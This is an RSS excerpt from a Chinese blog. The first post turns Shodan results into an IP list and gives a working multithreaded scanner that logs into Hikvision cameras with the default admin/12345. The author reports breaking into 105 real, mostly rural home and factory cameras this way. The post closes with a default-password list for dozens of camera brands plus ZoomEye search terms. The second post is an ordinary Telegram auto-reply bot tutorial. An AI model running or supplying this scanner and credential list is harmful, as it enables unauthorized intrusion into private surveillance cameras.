+<span class="c1">#-*-coding:utf-8-*-</span>
+
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">fi</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;shodan_data.json&#34;</span><span class="p">)</span>
+<span class="n">fo</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;ip.txt&#34;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+
+<span class="n">line</span> <span class="o">=</span> <span class="n">fi</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+<span class="n">numall</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">while</span> <span class="n">line</span><span class="p">:</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">fi</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
+    <span class="n">numall</span> <span class="o">=</span> <span class="n">numall</span><span class="o">+</span><span class="mi">1</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">a</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s1">&#39;http&#39;</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+            <span class="n">num</span> <span class="o">=</span> <span class="n">num</span><span class="o">+</span><span class="mi">1</span>
+            <span class="n">txt</span> <span class="o">=</span> <span class="n">a</span><span class="p">[</span><span class="s1">&#39;http&#39;</span><span class="p">][</span><span class="s1">&#39;host&#39;</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;:&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">])</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+            <span class="n">fo</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">txt</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">continue</span>
+
+<span class="n">fo</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">fi</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">numall</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="分析与扫描">分析与扫描</h2>
+<p>然后通过多线程python脚本进行弱密码批量扫描。</p>
+<p>通过手工尝试找到一台可以弱密码登录进去的机器，通过burp抓包分析，找到用来验证弱密码的接口。</p>
+<p></p>
+<p>分析发现登录使用的是base auth，这就简单了。使用的接口是userCheck，如果登录成功应该返回200.</p>
+<p></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1">#-*-coding:utf-8-*-</span>
+<span class="c1">#批量筛选海康威视摄像头的弱密码</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">queue</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">re</span>
+
+<span class="k">def</span> <span class="nf">Threads</span><span class="p">():</span>
+    <span class="n">threadlist</span><span class="o">=</span><span class="p">[]</span>
+    <span class="n">myqueue</span><span class="o">=</span><span class="n">queue</span><span class="o">.</span><span class="n">Queue</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">ip</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ip.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">):</span> <span class="c1">#扫描出的ip</span>
+        <span class="n">myqueue</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">ip</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">))</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>  <span class="c1">#线程数</span>
+        <span class="n">th</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">scan_Hikvision</span><span class="p">,</span><span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">myqueue</span><span class="p">,))</span>
+        <span class="n">threadlist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">th</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threadlist</span><span class="p">:</span>
+        <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threadlist</span><span class="p">:</span>
+        <span class="n">t</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">scan_Hikvision</span><span class="p">(</span><span class="n">myqueue</span><span class="p">):</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">myqueue</span><span class="o">.</span><span class="n">empty</span><span class="p">():</span>
+        <span class="n">ip</span><span class="o">=</span><span class="n">myqueue</span><span class="o">.</span><span class="n">get</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s2">&#34;[*]scan:&#34;</span><span class="o">+</span><span class="n">ip</span><span class="p">)</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;http://</span><span class="si">%s</span><span class="s2">/PSIA/Custom/HIK/userCheck&#34;</span> <span class="o">%</span> <span class="n">ip</span><span class="p">),</span><span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;12345&#39;</span><span class="p">),</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+            <span class="n">status</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;statusValue&gt;(.*)&lt;/statusValue&gt;&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">status</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;200&#39;</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[√] Host http://&#39;</span><span class="o">+</span> <span class="n">ip</span> <span class="o">+</span><span class="s1">&#39; Login Success!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+                <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;ok.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a+&#39;</span><span class="p">)</span>
+                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ip</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+                <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+                <span class="k">break</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">continue</span>
+
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">Threads</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>正好有个美国的vps，就扔到这个服务器上进行扫描，本机也开起来扫</p>
+<p>100线程很快就扫描完毕了，国内外扫描完的结果去重后一共留下105个可登录弱密码。感觉不应该只有这么点，登录后查看只发现一个版本的海康威视，可能是检测弱密码的接口在其他版本中不存在，或者其他版本默认密码更换或者其他原因</p>
+<h2 id="后话">后话</h2>
+<p>海康威视应该是采取了手段来避免弱密码的再次产生，但是之前老版本的DVR还有一部分并没有进行更新，大部分是农村的家庭或工厂监控，大家也都不太懂，并没有修改默认密码</p>
+<p>心里不是滋味，身边也有一些父母的朋友他们让我帮忙安装一些路由器、监控等设备，他们的文化水平不高，当我要给他们修改密码的时候，一部分会选择手机号码，也有一部分让我不要修改密码，说改了别记不住，直接出厂密码就行了，忘了可以看一下说明书</p>
+<p>能不能想出一种办法，既考虑到安全性，又能顾虑到这部分人的需求，这是个问题</p>
+<h2 id="弱密码收集">弱密码收集</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">1.海康威视IP网络摄像机：
+用户：admin，密码：12345
+zoomeye搜索关键词：hikvision
+2.大华网络摄像机：
+user:admin pass:admin 管理权限
+user:default pass:user 用户默认登陆帐号
+user:888888 pass:admin
+user:666666 pass:user
+zoomeye搜索关键词：WEB SERVICE
+3.cctv摄像机：
+user：admin pass：空
+telnet登陆 user：root pass：”juantech”
+zoomeye搜索关键词：JAWS/1.0
+4.SQ-WEBCAM摄像机：
+user：admin pass：admin
+zoomeye搜索关键词：SQ-WEBCAM
+ACTi: admin/123456 or Admin/123456
+American Dynamics: admin/admin or admin/9999
+Arecont Vision: none
+Avigilon: admin/admin
+Axis: traditionally root/pass, new Axis cameras require password creation during first login
+Basler: admin/admin
+Bosch: none
+Brickcom: admin/admin
+Canon: root/camera
+Cisco: No default password, requires creation during first login
+Dahua: admin/admin
+Digital Watchdog: admin/admin
+DRS: admin/1234
+DVTel: Admin/1234
+DynaColor: Admin/1234
+FLIR: admin/fliradmin
+Foscam: admin/
+GeoVision: admin/admin
+Grandstream: admin/admin
+Hikvision: admin/12345
+Honeywell: admin/1234
+IQinVision: root/system
+IPX-DDK: root/admin or root/Admin\
+JVC: admin/jvc
+March: Networks: admin/
+Mobotix: admin/meinsm
+Panasonic: admin/12345
+Pelco Sarix: admin/admin
+Pixord: admin/admin
+Samsung Electronics: root/root or admin/4321
+Samsung Techwin (old): admin/1111111
+Samsung (new): admin/4321
+Sanyo: admin/admin
+Scallop: admin/password
+Sentry360 (mini): admin/1234
+Sentry360 (pro): none
+Sony: admin/admin
+Speco: admin/1234
+Stardot: admin/admin
+Starvedia: admin/
+Trendnet: admin/admin
+Toshiba: root/ikwd
+VideoIQ: supervisor/supervisor
+Vivotek: root/
+Ubiquiti: ubnt/ubnt
+Wodsee: admin/
+</code></pre></td></tr></table>
+</div>
+</div>]]></description></item><item><title>Telegram关键词自动回复机器人</title><link>https://lgf.im/posts/coding/telegram-keyword-reply-bot/</link><pubDate>Tue, 26 Nov 2019 19:03:35 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/telegram-keyword-reply-bot/</guid><description><![CDATA[<h2 id="前言">前言</h2>
+<p>高中时期了解了telegram，大学期间正式开始使用。自己的频道最多的时候有上万人关注，聊天群组里人数也很多，但是时间久了我发现了一个问题。因为telegram在国内并不常用，新加入的成员往往都是新手，通常会问一些琐碎的、相似的问题，例如：如何汉化tg、+86号码无法私聊别人，等等相关的问题是在不想重复回答，便产生了制作一个关键词回复机器人的想法。</p>
+<h2 id="功能">功能</h2>
+<p>下面简单说一下机器人实现的一些功能，具体还是推荐你亲身进行体验。</p>
+<ul>
+<li>首先为了满足最初的需求，机器人需要能够对特定关键词回复特定的文字内容。</li>
+<li>为了能够更加灵活的匹配关键词，针对关键词识别增加了正则匹配方式的关键词识别方法，可以让用户能够编写更加灵活的关键词规则。</li>
+<li>为了满足更加更多种类的回复内容，回复种类除了文字还增加了照片、动图、视频、文件、表情、Marddown等其他的回复种类，并且允许给图片、文件等添加描述信息。</li>
+<li>为了满足部分群组的多样化回复需求，回复方式增加了 多个回复消息混合、多个回复类型混合、回复内容随机选择 等复杂但灵活的规则配置方式。</li>
+<li>为了能够实现部分群管功能，回复类型增加了群管操作，包括 消息删除、消息置顶、人员禁言、人员踢出等功能，只需要设置相应的关键词回复规则即可。</li>
+<li>除了关键词功能外，我还给机器人增加了群管命令、获取用户id信息、禁言游戏、加群欢迎、退群送别、一键呼叫所有管理员等功能。</li>
+</ul>
+<p>下面我将演示一些基本的功能配置和使用方法。</p>
+<h2 id="使用示例">使用示例</h2>
+<p>关键词规则的使用<br>
+添加规则使用 /add 关键词===回复内容<br>
+删除规则使用 /del 关键词<br>
+查看规则在群组里使用 /list</p>
+<h3 id="回复文本内容">回复文本内容</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 汉化===tg支持语言包功能，点击【链接】即可修改为中文。
+</code></pre></td></tr></table>
+</div>
+</div><p>添加这条规则之后，机器人就会对每一条包含有“汉化”关键词的消息回复“tg支持语言包功能，点击【链接】即可修改为中文。”这个特定内容。</p>
+<p>回复文字支持markdown语法，添加前缀 <code>md::</code> 即可使用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">/add <span class="nv">testmd</span><span class="o">===</span>md::加粗**bold**
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="回复图片">回复图片</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 关键词===photo::图片链接
+</code></pre></td></tr></table>
+</div>
+</div><p>图片链接需要时互联网上tg服务器可以访问到的图片，可以是tg上公开群组或者频道的图片消息链接或者互联网上任意图片资源链接</p>
+<p>例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 小白兔===photo::https://img.cdn.com/tupian.jpg
+
+/add 小可爱===photo::https://t.me/peekfun/1000
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="回复动图视频文件">回复动图\视频\文件</h3>
+<p>机器人除了回复图片外，还支持回复动图、视频、文件，如果你已经学会了回复图片，那这些种类也没有问题。</p>
+<ul>
+<li>动图 <code>/add 关键词===gif::动图链接</code></li>
+<li>视频 <code>/add 关键词===video::视频链接</code></li>
+<li>文件 <code>/add 关键词===file::文件链接</code></li>
+</ul>
+<p>需要注意的是，各种链接要么是tg上公开群组或者频道的链接（私有群组不行），要么是互联网上的资源链接，注意链接需要与发送的种类对应好。</p>
+<h3 id="图片文件添加文字">图片\文件添加文字</h3>
+<p>在手动发送图片等的时候我们可以添加描述信息，机器人回复规则也可以。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行
+
+/add 关键词===photo::图片链接::描述文字
+
+/add 小白兔===
+            photo::https://img.cdn.com/tupian.jpg  ::
+            这里是描述文字，例如原来你也喜欢小白兔呀
+</code></pre></td></tr></table>
+</div>
+</div><p>文件的使用也是类似，就不再重复</p>
+<blockquote>
+<p>注意：图片和文件的介绍文字默认开启markdown语法</p>
+</blockquote>
+<h3 id="正则表达式进行匹配">正则表达式进行匹配</h3>
+<p>现在你已经会使用关键词来回复特定内容了，但是为了更加灵活的回复，而不是令机器人看起来傻乎乎的<br>
+事实上机器人聪明与否完全看你设置的关键词规则是否灵活，你需要学习简单的正则表达式并且利用正则来进行匹配。</p>
+<p>使用正则匹配非常简单，只需要将原来的关键词替换为 <code>re:正则规则</code> 即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add re:(如何|怎样).*(激活|使用)===请查看这个说明
+</code></pre></td></tr></table>
+</div>
+</div><p>在这个例子里面，使用了正则表达式进行了匹配，此时用户发送 “有谁知道怎样进行账号的激活吗？”也可以匹配上，这大大提高了规则的灵活性。</p>
+<blockquote>
+<p>需要说明的是，机器人的所有关键词使用方法均支持正则，你可以随意进行尝试。</p>
+</blockquote>
+<h3 id="一次回复多条消息">一次回复多条消息</h3>
+<p>有些时候一条消息无法满足回复的需求，需要机器人同时返回多个消息，这也是支持的。</p>
+<p>你只需要用 || 将多个回复内容间隔开就可以了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 关键词===回复文字1||回复文字2||回复文字3
+</code></pre></td></tr></table>
+</div>
+</div><p>不同种类的回复内容也可以混合在一起，请随意混搭</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行
+/add 关键词===
+            请欣赏  ||
+            photo::图片链接  ||
+            video::视频链接  ||
+            如果需要更多内容，你可以下载软件  ||
+            file::文件链接
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="回复随机消息">回复随机消息</h3>
+<p>有一个群组提出了这样一个特定需求，想要从设置好的回复内容中随机回复一个，这也是支持的。</p>
+<p>使用方法：<br>
+random{回复内容1$$回复内容2$$回复内容3}，使用两个英文的$符号间隔。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行
+/add 关键词===
+            random::{
+                一条消息  $$
+                photo::PHOTO_URL  $$
+                另一条消息
+            }
+</code></pre></td></tr></table>
+</div>
+</div><p>在这个关键词规则里，机器人将自动从三条消息中选择一个发出。</p>
+<p>你可以结合上面一个使用方法，让规则更加灵活</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">为了便于理解，添加了缩进和换行，添加规则的时候不要缩进和换行
+/add 小白兔===
+            你也喜欢小白兔呀，送你一张小白兔的照片  ||
+            random::{
+                photo::照片链接1 $$
+                photo::照片链接2 $$
+                photo::照片链接3
+            }  ||
+            如果喜欢可以下载软件获取更多图片  ||
+            file::文件的链接
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="自动删除消息">自动删除消息</h3>
+<p>大多数时候我们需要屏蔽一些关键词，防止用户讨论相关内容，比如说政治、色情、黑产等内容。<br>
+机器人既然可以识别关键词，就可以进行相关消息删除操作，你需要给机器人删除消息的管理员权限。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 日站===delete
+</code></pre></td></tr></table>
+</div>
+</div><p>这样机器人就会将含有 日站 二字的消息自动删除，起到屏蔽的作用，你可以使用正则进行更加灵活的匹配。</p>
+<p>直接删除可能不太友好，你可以结合前面的内容进行优化，比如结合多个回复内容进行添加提示语。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add 日站===本群禁止讨论黑产相关内容||delete
+</code></pre></td></tr></table>
+</div>
+</div><p>这样的规则机器人就会先回复“本群禁止讨论黑产相关内容”，然后再进行删除。</p>
+<blockquote>
+<p>注意：delete一定要放在最后，否则回复消息发送不出来。</p>
+</blockquote>
+<h3 id="自动禁言踢人">自动禁言\踢人</h3>
+<p>只删除还不过瘾，有人刷消息？禁言和踢人同样支持。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">禁言
+/add <span class="nv">keyword</span><span class="o">===</span>ban
+会自动禁言发送keyword的用户 永久
+
+禁言特定时长
+/add <span class="nv">keyword</span><span class="o">===</span>ban::3d6h20m36s
+会自动禁言发送keyword的用户 3天6个小时20分钟36s
+时长信息4个时间单位不必全部写满，时长换算成秒如果低于30s意味着永久禁言，多于1年也是永久禁言
+
+踢人
+/add <span class="nv">日站</span><span class="o">===</span>kick
+</code></pre></td></tr></table>
+</div>
+</div><p>你还是可以结合上面的内容进行优化，因为delete、ban、kick也是回复种类之一，所以跟文字、照片、视频、文件等的使用方法相同，也就可以进行组合。</p>
+<h3 id="屏蔽特定后缀文件">屏蔽特定后缀文件</h3>
+<p>有人发送exe\com\bat等后缀的病毒？不用再去找其他机器人了，使用自定义规则即可完成屏蔽和禁言。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add re:(\.exe|\.scr|\.cpl|\.com|\.cmd|\.bat|\.vbs)$===ban
+</code></pre></td></tr></table>
+</div>
+</div><p>这样带有exe\src\cpl\com\cmd\bat\vbs等可执行后缀的文件就会被自动删除，相关发送者就会被禁言。</p>
+<blockquote>
+<p>关键词功能可以根据每个群组添加的不同的关键词规则实现一些简单的回复或者更加复杂的操作，通过组合等方式来实现相应功能完全看你的规则，所以发挥你的脑洞吧。</p>
+</blockquote>
+<h3 id="进群欢迎和退群欢送">进群欢迎和退群欢送</h3>
+<p>机器人可以设置欢迎和欢送文字</p>
+<p>需要使用 <code>/welcome</code> 和 <code>/goodbye</code> 命令分别开启</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">/welcome
+开启后，可以设置内容
+/setwelcometext 欢迎 <span class="nv">$username</span> 加入 <span class="nv">$groupname</span> 这个大家庭
+
+/goodbye
+开启后，可以设置内容
+/setgoodbyetext <span class="nv">$username离开了我们群</span>
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>注意：加群欢迎和退群欢送文字默认开启markdown语法
+使用 $userid 自动替换 用户id, $username 自动替换用户名
+使用 $groupid 自动替换 群组id， $groupname 自动替换群组名</p>
+</blockquote>
+<h3 id="回复按钮">回复按钮</h3>
+<blockquote>
+<p>看样子很多人需要这个功能，就加上了</p>
+</blockquote>
+<p>示例：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">/add test===button::{&#34;text&#34;: &#34;测试按钮消息，支持_Markdown_&#34;,&#34;buttons&#34;: [[{&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},{&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;},{&#34;text&#34;:&#34;拾取&#34;,&#34;url&#34;:&#34;http://t.me/peekfun&#34;}],[{&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},{&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;}]]}
+</code></pre></td></tr></table>
+</div>
+</div><p>button::后面的json格式如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">{
+    &#34;text&#34;: &#34;测试按钮消息，支持_Markdown_&#34;,   // 这里是回复的消息内容，支持markdown，群组名替换啥的
+    &#34;buttons&#34;: [ // 按钮列表
+        // 第一行按钮
+        [
+            {&#34;text&#34;:&#34;百度&#34;,&#34;url&#34;:&#34;https://baidu.com&#34;},
+            {&#34;text&#34;:&#34;谷歌&#34;,&#34;url&#34;:&#34;https://google.com&#34;},
